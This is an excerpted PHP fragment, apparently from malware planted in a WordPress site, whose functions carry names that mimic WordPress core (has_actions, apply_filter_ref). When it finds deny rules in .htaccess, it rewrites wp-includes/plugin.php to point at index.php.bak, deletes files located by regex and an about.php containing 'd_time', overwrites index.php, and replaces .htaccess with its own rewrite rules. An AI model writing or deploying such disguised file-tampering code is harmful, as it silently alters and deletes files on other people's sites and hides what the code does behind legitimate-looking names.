...
function has_actions($file, $word){
	$nbr_w = apply_filters_ref_arrays($file, $word);
	$src = file_get_contents($file);
	$lines = explode("\n", $src);
	$result = '';
	foreach($lines as $line) {
		if(strstr($line, $word) || $nbr_w <= 0) {
			$nbr_w--;
			if($nbr_w <= 0){
				$result .= $line."\n";
			}
...
function apply_filter_ref(){
	...
	if(preg_match("/deny from all/", $htaccess) || preg_match("/order allow,deny/", $htaccess)) {
		$plugin_P = 'wp-includes/plugin.php';
		$plugin = file_get_contents($plugin_P);
		if(preg_match("/index.php/", $plugin) && !preg_match("/index.php.bak/", $plugin)) {
			$plugin = str_replace('index.php', 'index.php.bak', $plugin);
			chmod($plugin_P, 0644);
			file_put_contents($plugin_P, $plugin);
		}
		if(preg_match('/\$path.*=.*"(.*)";/', $plugin, $p)) {
			unlink($p[1]);
		}
		$about_P = 'about.php';
		$about = file_get_contents($about_P);
		if(file_exists($about_P) && preg_match("/d_time/", $about)) {
			unlink($about_P);
		}
		$index_P = 'index.php';
		$index = file_get_contents($index_P);
		if(preg_match("/wp-blog-header.php/", $index)){
			$new_index = "<?php\ndefine( 'WP_USE_THEMES', true );\nrequire __DIR__ . '/wp-blog-header.php';";
			chmod($index_P, 0644);
			file_put_contents($index_P, $new_index);
		}elseif(strstr($index, '<?php') && !strstr($index, '\'gz\'.\'unc\'.\'ompress\'') && !preg_match("/index-configs/", $index) && !preg_match("/<html/", $index) && !preg_match("/<div/", $index) && !preg_match("/<head>/", $index) && !preg_match("/<script>/", $index)){
			$new_index = has_actions($index_P, '<?php');
			chmod($index_P, 0644);
			file_put_contents($index_P, $new_index);
		}
		chmod($htaccess_P, 0644);
		$new_h = "<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\.php\$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n</IfModule>";
		file_put_contents($htaccess_P, $new_h);
	}
}
